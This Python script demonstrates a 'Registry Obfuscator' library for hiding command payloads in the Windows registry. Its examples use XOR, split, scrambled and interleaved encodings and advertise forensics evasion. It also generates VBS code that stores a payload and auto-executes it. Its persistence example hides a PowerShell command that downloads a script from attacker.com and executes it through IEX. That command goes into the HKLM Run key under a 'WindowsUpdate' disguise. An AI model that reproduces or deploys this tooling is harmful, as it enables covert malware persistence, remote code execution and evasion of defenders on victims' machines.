#!/usr/bin/env python3
"""
Practical examples for Registry Obfuscator usage
Demonstrates all obfuscation types with real-world scenarios
"""

from registry_obfuscator import (
    RegistryObfuscator, ObfuscationConfig, ObfuscationType,
    RegistryStorageGenerator
)
import json


def example_1_basic_binary_obfuscation():
    """Example 1: Simple binary obfuscation with junk data"""
    print("=" * 70)
    print("EXAMPLE 1: Basic Binary Obfuscation")
    print("=" * 70)

    payload = "powershell.exe -NoProfile -Command 'Get-Process'"

    config = ObfuscationConfig(
        obfuscation_type=ObfuscationType.BINARY,
        add_junk_data=True,
        junk_ratio=0.3
    )

    obfuscator = RegistryObfuscator(config)
    result = obfuscator.obfuscate(payload)

    print(f"\nPayload: {payload}")
    print(f"\nRegistry Values to Store:")
    for name, (data, reg_type) in result['registry_values'].items():
        truncated = data[:60] + "..." if len(data) > 60 else data
        print(f"  {name}: {reg_type}")
        print(f"    Value: {truncated}")

    print(f"\nMetadata:")
    print(f"  Offset: {result['metadata']['data_offset']}")
    print(f"  Size: {result['metadata']['original_size']}")
    print(f"  Has Junk: {result['metadata']['has_junk']}")


def example_2_hex_string_with_obfuscation():
    """Example 2: Hex string obfuscation for stealth"""
    print("\n" + "=" * 70)
    print("EXAMPLE 2: Hex String Obfuscation")
    print("=" * 70)

    payload = "cmd.exe /c ipconfig"

    config = ObfuscationConfig(
        obfuscation_type=ObfuscationType.HEX_STRING,
        add_junk_data=True,
        junk_ratio=0.2
    )

    obfuscator = RegistryObfuscator(config)
    result = obfuscator.obfuscate(payload)

    print(f"\nPayload: {payload}")
    print(f"\nRegistry Value:")
    for name, (data, reg_type) in result['registry_values'].items():
        truncated = data[:60] + "..." if len(data) > 60 else data
        print(f"  Name: {name}")
        print(f"  Type: {reg_type}")
        print(f"  Value: {truncated}")


def example_3_split_values_large_payload():
    """Example 3: Split values for large payload"""
    print("\n" + "=" * 70)
    print("EXAMPLE 3: Split Values (Distributed Storage)")
    print("=" * 70)

    # Simulate larger payload
    payload = "powershell.exe -NoProfile -ExecutionPolicy Bypass " + \
              "-EncodedCommand {0}" * 20  # Simulate large payload

    config = ObfuscationConfig(
        obfuscation_type=ObfuscationType.SPLIT_VALUES,
        chunk_size=64,
        scramble_order=True,
        add_junk_data=True,
        junk_ratio=0.2
    )

    obfuscator = RegistryObfuscator(config)
    result = obfuscator.obfuscate(payload)

    print(f"\nPayload Length: {len(payload)} bytes")
    print(f"Chunk Size: 64 bytes")
    print(f"Total Chunks: {result['metadata']['total_chunks']}")
    print(f"Payload Chunks: {result['metadata']['chunk_count']}")
    print(f"Junk Chunks: {result['metadata']['total_chunks'] - result['metadata']['chunk_count']}")

    print(f"\nRegistry Structure:")
    chunk_values = [k for k in result['registry_values'].keys() if k.startswith('Chunk') and k != 'ChunkCount']
    index_values = [k for k in result['registry_values'].keys() if k.startswith('Index')]

    for chunk_name, index_name in zip(sorted(chunk_values)[:3], sorted(index_values)[:3]):
        data, _ = result['registry_values'][chunk_name]
        idx, _ = result['registry_values'][index_name]
        print(f"  {chunk_name}: {data[:40]}... (Index: {idx})")

    print(f"  ... ({len(chunk_values)} total chunks)")


def example_4_xored_polymorphic():
    """Example 4: XOR obfuscation for polymorphic payloads"""
    print("\n" + "=" * 70)
    print("EXAMPLE 4: XOR Polymorphic Obfuscation")
    print("=" * 70)

    payload = "calc.exe"

    print(f"\nPayload: {payload}")
    print(f"\nGenerating 3 polymorphic variants with different XOR keys:")

    for i in range(3):
        config = ObfuscationConfig(
            obfuscation_type=ObfuscationType.XORED
            # Random XOR key each time
        )

        obfuscator = RegistryObfuscator(config)
        result = obfuscator.obfuscate(payload)

        xor_key_str, _ = result['registry_values']['XorKey']
        payload_str, _ = result['registry_values']['XoredPayload']

        print(f"\nVariant {i + 1}:")
        print(f"  XOR Key: {xor_key_str}")
        print(f"  Payload: {payload_str[:40]}...")


def example_5_interleaved_forensics():
    """Example 5: Interleaved obfuscation for forensics evasion"""
    print("\n" + "=" * 70)
    print("EXAMPLE 5: Interleaved Obfuscation (Forensics Evasion)")
    print("=" * 70)

    payload = "whoami /all"

    config = ObfuscationConfig(
        obfuscation_type=ObfuscationType.INTERLEAVED,
        junk_ratio=0.4
    )

    obfuscator = RegistryObfuscator(config)
    result = obfuscator.obfuscate(payload)

    print(f"\nPayload: {payload}")
    print(f"Payload Length: {len(payload)} bytes")

    mask = result['metadata']['mask']
    print(f"\nMask (payload byte positions):")
    print(f"  {', '.join(map(str, mask))}")

    data, _ = result['registry_values']['InterleavedData']
    print(f"\nInterleaved Hex Data (first 100 chars):")
    print(f"  {data[:100]}")

    print(f"\nStealth Features:")
    print(f"  - Payload bytes hidden among junk bytes")
    print(f"  - Mask required for reconstruction")
    print(f"  - Defeats memory dump analysis")


def example_6_base64_compatibility():
    """Example 6: Base64 for maximum compatibility"""
    print("\n" + "=" * 70)
    print("EXAMPLE 6: Base64 Obfuscation (Compatibility)")
    print("=" * 70)

    payload = "powershell.exe -Command \"Write-Host 'Hello World'\""

    config = ObfuscationConfig(
        obfuscation_type=ObfuscationType.BASE64,
        add_junk_data=False  # No junk for compatibility
    )

    obfuscator = RegistryObfuscator(config)
    result = obfuscator.obfuscate(payload)

    print(f"\nPayload: {payload}")
    print(f"\nRegistry Values:")

    for name, (data, reg_type) in result['registry_values'].items():
        print(f"  {name}: {data}")

    print(f"\nCharacteristics:")
    print(f"  - Standard Base64 encoding")
    print(f"  - Compatible with PowerShell")
    print(f"  - Easy to integrate with other tools")


def example_7_vbs_storage_code():
    """Example 7: Generate complete VBS storage code"""
    print("\n" + "=" * 70)
    print("EXAMPLE 7: VBS Storage Code Generation")
    print("=" * 70)

    payload = "powershell.exe -WindowStyle Hidden -Command 'Write-Host Test'"

    config = ObfuscationConfig(
        obfuscation_type=ObfuscationType.HEX_STRING,
        add_junk_data=True
    )

    obfuscator = RegistryObfuscator(config)
    generator = RegistryStorageGenerator(obfuscator)

    # Generate storage VBS code
    vbs_code = generator.generate_storage_vbs(
        payload,
        registry_hive="HKCU",
        registry_path="Software\\Microsoft\\Windows\\CurrentVersion",
        value_prefix="SystemUpdate"
    )

    print(f"\nPayload: {payload}")
    print(f"\nGenerated VBS Storage Code (first 600 chars):")
    print("-" * 70)
    print(vbs_code[:600])
    print("-" * 70)
    print("... (truncated)")


def example_8_vbs_retrieval_code():
    """Example 8: Generate complete VBS retrieval code"""
    print("\n" + "=" * 70)
    print("EXAMPLE 8: VBS Retrieval Code Generation")
    print("=" * 70)

    config = ObfuscationConfig(
        obfuscation_type=ObfuscationType.BINARY
    )

    obfuscator = RegistryObfuscator(config)
    generator = RegistryStorageGenerator(obfuscator)

    # Generate retrieval VBS code
    vbs_code = generator.generate_retrieval_vbs(
        registry_hive="HKCU",
        registry_path="Software\\Microsoft\\Windows\\CurrentVersion",
        value_prefix="SystemUpdate",
        auto_execute=True
    )

    print(f"\nGenerated VBS Retrieval Code with Auto-Execute:")
    print("-" * 70)
    print(vbs_code)
    print("-" * 70)


def example_9_comparison_all_types():
    """Example 9: Compare all obfuscation types"""
    print("\n" + "=" * 70)
    print("EXAMPLE 9: Obfuscation Type Comparison")
    print("=" * 70)

    payload = "C:\\Windows\\System32\\notepad.exe"

    print(f"\nPayload: {payload}")
    print(f"Payload Length: {len(payload)} bytes")

    print(f"\n{'Type':<15} {'Storage Size':<15} {'Chunks':<10} {'Speed':<10}")
    print("-" * 50)

    obfuscation_types = [
        ObfuscationType.BINARY,
        ObfuscationType.HEX_STRING,
        ObfuscationType.SPLIT_VALUES,
        ObfuscationType.INTERLEAVED,
        ObfuscationType.XORED,
        ObfuscationType.BASE64,
        ObfuscationType.CHUNKED_HEX,
    ]

    for obf_type in obfuscation_types:
        config = ObfuscationConfig(
            obfuscation_type=obf_type,
            add_junk_data=False
        )

        obfuscator = RegistryObfuscator(config)
        result = obfuscator.obfuscate(payload)

        # Calculate total storage size
        total_size = sum(len(data) for data, _ in result['registry_values'].values())

        # Count chunks
        if obf_type == ObfuscationType.SPLIT_VALUES:
            chunk_count = len([k for k in result['registry_values'].keys() if k.startswith('Chunk')])
        elif obf_type == ObfuscationType.BASE64:
            chunk_count = result['metadata']['part_count']
        elif obf_type == ObfuscationType.CHUNKED_HEX:
            chunk_count = result['metadata']['chunk_count']
        else:
            chunk_count = 1

        # Speed estimate
        if obf_type == ObfuscationType.XORED:
            speed = "Fastest"
        elif obf_type in [ObfuscationType.HEX_STRING, ObfuscationType.BINARY]:
            speed = "Fast"
        elif obf_type == ObfuscationType.INTERLEAVED:
            speed = "Medium"
        elif obf_type == ObfuscationType.BASE64:
            speed = "Medium"
        else:
            speed = "Slow"

        print(f"{obf_type.value:<15} {total_size:<15} {chunk_count:<10} {speed:<10}")


def example_10_persistence_scenario():
    """Example 10: Real-world persistence scenario"""
    print("\n" + "=" * 70)
    print("EXAMPLE 10: Persistence Scenario")
    print("=" * 70)

    # Simulate a real command that runs at startup
    persistence_command = "powershell.exe -WindowStyle Hidden -NoProfile " + \
                         "-ExecutionPolicy Bypass -Command " + \
                         "\"$url='http://attacker.com/payload'; " + \
                         "Invoke-WebRequest $url | IEX\""

    print(f"\nScenario: Store persistence payload in HKLM Run key")
    print(f"Command: {persistence_command[:80]}...")

    # Use split values for distributed storage + scrambling
    config = ObfuscationConfig(
        obfuscation_type=ObfuscationType.SPLIT_VALUES,
        chunk_size=128,
        scramble_order=True,
        add_junk_data=True,
        junk_ratio=0.3
    )

    obfuscator = RegistryObfuscator(config)
    generator = RegistryStorageGenerator(obfuscator)

    # Generate storage code
    vbs_code = generator.generate_storage_vbs(
        persistence_command,
        registry_hive="HKLM",
        registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        value_prefix="WindowsUpdate"
    )

    print(f"\nGenerated VBS Code (first 500 chars):")
    print("-" * 70)
    print(vbs_code[:500])
    print("-" * 70)
    print("... (truncated)")

    print(f"\nKey Features:")
    print(f"  - Payload split across multiple values")
    print(f"  - Chunk order scrambled")
    print(f"  - Junk chunks added for confusion")
    print(f"  - Stored in HKLM Run key (requires admin)")
    print(f"  - Persists across reboots")


def main():
    """Run all examples"""
    examples = [
        example_1_basic_binary_obfuscation,
        example_2_hex_string_with_obfuscation,
        example_3_split_values_large_payload,
        example_4_xored_polymorphic,
        example_5_interleaved_forensics,
        example_6_base64_compatibility,
        example_7_vbs_storage_code,
        example_8_vbs_retrieval_code,
        example_9_comparison_all_types,
        example_10_persistence_scenario,
    ]

    print("\n" + "=" * 70)
    print("REGISTRY OBFUSCATOR - PRACTICAL EXAMPLES")
    print("=" * 70)

    for example_func in examples:
        try:
            example_func()
        except Exception as e:
            print(f"\nError in {example_func.__name__}: {e}")

    print("\n" + "=" * 70)
    print("ALL EXAMPLES COMPLETED")
    print("=" * 70)


if __name__ == "__main__":
    main()
